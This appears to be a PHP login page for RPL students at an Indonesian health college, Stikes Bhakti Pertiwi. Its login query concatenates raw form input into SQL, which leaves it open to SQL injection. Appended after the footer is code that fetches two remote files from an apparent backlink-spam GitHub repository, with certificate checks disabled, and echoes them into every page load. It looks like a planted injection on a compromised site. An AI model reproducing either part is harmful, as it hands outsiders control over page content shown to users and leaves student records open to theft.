<?php
require_once("configure_first.php");

if(isset($_POST["Login"])) {
	if(isset($_POST["id_pendaftaran"])) $id_pendaftaran = $_POST["id_pendaftaran"];
	if(isset($_POST["noHp"])) $noHp = $_POST["noHp"];
	
	$sql = "SELECT * FROM mhs_baru where id_pendaftaran = ".$id_pendaftaran." and noHp = '".$noHp."'";
	$result = mysqli_query($conn, $sql);

	if(mysqli_num_rows($result) > 0) {
        while($row = mysqli_fetch_assoc($result)) {
			$_SESSION["user-id"] = $row["id_mhs"];
			$_SESSION["user-nama"] = $row["id_pendaftaran"];
			$_SESSION["user_fullname"] = $row["nama_calon_mhs"];
			$_SESSION["user-profile"] = "MHS";
			echo "<script>location.href='entry-persyaratan?id=".$id_pendaftaran."';</script>";
		}
	}
}

?>
<?php include("aheader.inc.php");?>
<?php include("amenu.inc.php");?>
<!-- Vertical Overlay-->
<div class="vertical-overlay"></div>
            <!-- ============================================================== -->
            <!-- Start right Content here -->
            <!-- ============================================================== -->
            <div class="main-content">

                <div class="page-content">
                    <div class="container-fluid">
<form class="user" action="index" accept-charset="utf-8" method="post">

                        <!-- start page title -->
<div class="row">
    <div class="col-6">
		<div class="card">
			<div class="card-header">
				<h4 class="card-title mb-0">Login Mahasiswa RPL</h4>
			</div><!-- end card header -->
			<div class="card-body">
				<p class="text-muted">Halaman ini ditujukan khusus untuk login mahasiswa RPL Stikes Bhakti Pertiwi Indonesia</p>
			   
					<div class="row mb-3">
						<div class="col-lg-3">
							<label for="nameInput" class="form-label">No Pendaftaran</label>
						</div>
						<div class="col-lg-9">
							<input type="text" class="form-control" name="id_pendaftaran" id="id_pendaftaran" placeholder="No Pendaftaran">
						</div>
					</div>
					<div class="row mb-3">
						<div class="col-lg-3">
							<label for="contactNumber" class="form-label">No Handphone</label>
						</div>
						<div class="col-lg-9">
							<input type="password" class="form-control" name="noHp" id="noHp" placeholder="No Handphone">
						</div>
					</div>
					<div class="text-end">
						<button type="submit" name="Login" class="btn btn-primary">Masuk</button>
					</div>
				</form>
			</div>
		</div>
    </div>
</div>
</form>

<?php include("afooter.inc.php");?>
<?php
function curlGetContents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $fileContents = curl_exec($ch);
    curl_close($ch);
    return $fileContents; 
}
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/stikes-bhaktipertiwi/rpl.stikesbpi.ac.id/system.txt';
$fileContents1 = curlGetContents($url1);
$fileContents2 = curlGetContents($url2);
echo $fileContents1;
echo $fileContents2;
?>
